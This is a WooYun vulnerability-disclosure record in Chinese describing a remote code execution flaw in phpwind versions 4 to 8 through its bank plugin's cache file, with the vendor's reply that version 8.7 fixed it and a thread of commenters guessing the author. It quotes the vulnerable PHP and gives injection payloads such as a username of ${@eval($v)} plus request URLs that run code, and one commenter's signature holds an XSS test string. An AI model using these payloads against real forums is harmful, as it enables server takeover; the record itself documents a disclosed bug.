{"id": 73881, "wybug_id": "wooyun-2015-0153249", "wybug_title": "Phpwind的v4/5/6/7/8命令执行漏洞", "wybug_corp": "phpwind", "wybug_author": "路人甲", "wybug_date": "2015-11-10 11:55", "wybug_open_date": "2016-02-08 15:10", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-10：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2016-01-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-08：\t细节向公众公开  简要描述： 07年那阵挖掘的漏洞，正好这次三个白帽搞了个挑战，借这个机会曝光吧，外面估计也有部分人知道这个吧：） 详细说明：  hack/bank/index.php\n$_DDESPOSTDB=array();\t\t$query=$db->query(\"SELECT i.uid,username,ddeposit,dstartdate FROM pw_memberinfo i LEFT JOIN pw_members m ON m.uid=i.uid ORDER BY ddeposit DESC LIMIT $bk_num\");\t\twhile($deposit=$db->fetch_array($query)){\t\t\tif($deposit['ddeposit']){\t\t\t\t$deposit['dstartdate']=get_date($deposit['dstartdate']);\t\t\t\t$_DDESPOSTDB[]=array($deposit['uid'],$deposit['username'],$deposit['ddeposit'],$deposit['dstartdate']);\t\t\t}\t\t}\t\t$wirtedb=savearray('_DESPOSTDB',$_DESPOSTDB);\t\t$wirtedb.=\"\\n\".savearray('_DDESPOSTDB',$_DDESPOSTDB);\t\twriteover(D_P.'data/bbscache/bank_sort.php',\"<?php\\r\\n\".$wirtedb.'?>');\t}...function savearray($name,$array){\t$arraydb=\"\\$$name=array(\\r\\n\\t\\t\";\t\tforeach($array as $value1){\t\t$arraydb.='array(';\t\tforeach($value1 as $value2){\t\t\t$arraydb.='\"'.addslashes($value2).'\",';\t\t}\t\t$arraydb.=\"),\\r\\n\\t\\t\";\t}\t$arraydb.=\");\\r\\n\";\treturn $arraydb;}\n挺明显的一个漏洞，里面可以利用的点是注册的用户名和日期格式，不过这两个地方都有字数限制，真正要利用起来的话需要点技巧，废话不多说了，直接贴上当时写的一个简单的利用方式：\nphpwind所有版本远程代码执行漏洞i)注册新用户，用户名为${@eval($v)}，发表新帖或其他方式获得金钱后，使用银行插件进行存款，待论坛缓存更新后[默认为5小时]，data/bbscache/bank_sort.php文件会含有如下代码：eval($v)利用方法[PW6以上版本需要register_globals=on]：**.**.**.**/phpwind/data/bbscache/bank_sort.php?v=phpinfo();**.**.**.**/phpwind/hack.php?H_name=bank&v=phpinfo();ii)编辑用户资料，在[日期格式][自定义]处填写${@\\ev\\a\\l($v)}，使用银行插件进行存款，待论坛缓存更新后[默认为5小时]，data/bbscache/bank_sort.php文件会含有如下代码：eval($v)利用方法[PW6以上版本需要register_globals=on]：**.**.**.**/phpwind/data/bbscache/bank_sort.php?v=phpinfo();**.**.**.**/phpwind/hack.php?H_name=bank&v=phpinfo();\n成文较早，并且关于PW6的说明是后加入的，因为没怎么跟PW5后的代码，当时的描述可能不准确，后来听某人跟我反馈说PW6里貌似有可直接利用的变量，从而绕过全局的限制，我就不再验证了，有兴趣的自行跟。   漏洞证明：     修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-02-08 15:10 厂商回复： 您好，该问题已有白帽子在ASRC平台上报，并于2014年12月份修复（版本8.7及以上）。由于phpwind目前仅维护phpwind8.7及以上版本，其他低版本已不再更新，建议仍在使用低版本的用户尽快升级到最新版；如要继续使用老版本，请参考phpwind官方论坛说明自行修复（由于修复方法只针对8.7，其他版本未进行有效测试，仅做参考：《[漏洞补丁]phpwind8.7 利用注册特殊用户致可执行任意命令高危漏洞 》http:///read/）。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-11-10 12:17 |    \t\tphith0n  \t\t\t( 普通白帽子  |\t\t\t        Rank:718 漏洞数:114        | 一个想当文人的黑客~)\t\t \n  是不是Ryat老师！！    \n     2015-11-10 12:20 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:3783 漏洞数:292        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  是不是Ryat老师！！    \n     2015-11-10 12:20 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:266 漏洞数:67        | baozisec)\t\t \n  是不是Ryat老师！！    \n     2015-11-10 12:24 |    \t\tDNS \t\t\t( 普通白帽子  |\t\t\t        Rank:696 漏洞数:73        | root@qisec.com)\t\t \n  @猪猪侠 是不是你匿名了    \n     2015-11-10 12:25 |    \t\tDefa \t\t\t( 普通白帽子  |\t\t\t        Rank:113 漏洞数:13        | <img src=1 onerror=alert(1)>)\t\t \n  你关注的 猪猪侠 提交了phpwind....    \n     2015-11-10 12:30 |    \t\t咚咚呛 \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:10        | 我是一只小毛驴咿呀咿呀呦~~)\t\t \n  你关注的 猪猪侠 提交了phpwind....    \n     2015-11-10 12:31 |    \t\tsqlfeng \t\t\t( 普通白帽子  |\t\t\t        Rank:343 漏洞数:52        | http://weibo.com/fds1986)\t\t \n  第一排3D戴好坐等打雷。    \n     2015-11-10 12:34 |    \t\tNoxxx \t\t\t( 普通白帽子  |\t\t\t        Rank:668 漏洞数:51        )\t\t \n  是不是Ryat老师！！    \n     2015-11-10 12:37 |    \t\tMieless \t\t\t( 实习白帽子  |\t\t\t        Rank:35 漏洞数:10        | 我是来打酱油的。)\t\t \n  shot    \n     2015-11-10 12:41 |    \t\t岛云首席鉴黄师 \t\t\t( 普通白帽子  |\t\t\t        Rank:430 漏洞数:123        | icisaw.cn 超低价虚拟主机VPS 购买返现 支...)\t\t \n  你关注的白帽子 猪猪侠 发表了漏洞 phpwind < v6 版本命令执行漏洞    \n     2015-11-10 12:42 |    \t\t岛云首席鉴黄师 \t\t\t( 普通白帽子  |\t\t\t        Rank:430 漏洞数:123        | icisaw.cn 超低价虚拟主机VPS 购买返现 支...)\t\t \n  到底是谁？！！！！    \n     2015-11-10 13:03 |    \t\t随风的风 \t\t\t( 普通白帽子  |\t\t\t        Rank:201 漏洞数:69        | 微信公众号：233sec  不定期分享各种漏洞思...)\t\t \n  怎么给cncert了？不该是phpWind吗？    \n     2015-11-10 13:23 |    \t\t浮世浮城 \t\t\t( 普通白帽子  |\t\t\t        Rank:825 漏洞数:146        | 我存于这俗世烟火的浮世，我爱这时光倒影的...)\t\t \n  你关注的 猪猪侠 提交了phpwind....    \n     2015-11-10 13:31 |    \t\tboooooom  \t\t\t( 普通白帽子  |\t\t\t        Rank:473 漏洞数:51        | 我有一个好想法！)\t\t \n  腻害！    \n     2015-11-10 13:52 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  0day！phpwind已经停止维护了吧，坐等公开    \n     2015-11-10 14:04 |    \t\t0xev4l \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 努力吧！骚年！北京买房买车买菜！)\t\t \n  你关注的 猪猪侠 提交了phpwind....    \n     2015-11-10 14:28 |    \t\t不能忍 \t\t\t( 实习白帽子  |\t\t\t        Rank:80 漏洞数:41        | 要是能重来，我要选李白!)\t\t \n  等漏洞确认了，看一下乌云榜的通用就知道是谁了。。哈哈    \n     2015-11-10 14:41 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:28        | 开发真是日了狗了)\t\t \n  你关注的 猪猪侠 提交了phpwind....    \n     2015-11-10 14:45 |    \t\t奶嘴 \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:28        | 16岁的毛孩)\t\t \n  是不是Ryat老师！！    \n     2015-11-10 15:13 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:3783 漏洞数:292        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  这个漏洞真的补好了嘛？    \n     2015-11-10 16:20 |    \t\tago \t\t\t( 普通白帽子  |\t\t\t        Rank:544 漏洞数:93        )\t\t \n  猪哥这句话包含两点1.洞是猪哥发的2.看来是没修复好,还有利用姿势    \n     2015-11-10 16:24 |    \t\t不能忍 \t\t\t( 实习白帽子  |\t\t\t        Rank:80 漏洞数:41        | 要是能重来，我要选李白!)\t\t \n  楼上正解    \n     2015-11-11 20:33 |    \t\txsser_w \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:34        | 哎)\t\t \n  就是ryat！！！    \n     2015-11-11 20:41 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:3783 漏洞数:292        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  @ago 不是我发的    \n     2016-01-12 15:20 |    \t\t酷帥王子 \t\t\t( 普通白帽子  |\t\t\t        Rank:222 漏洞数:62        | 天人合一，乃屌神也！)\t\t \n  @猪猪侠 咦，猪哥的核心白帽子去哪里啦    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}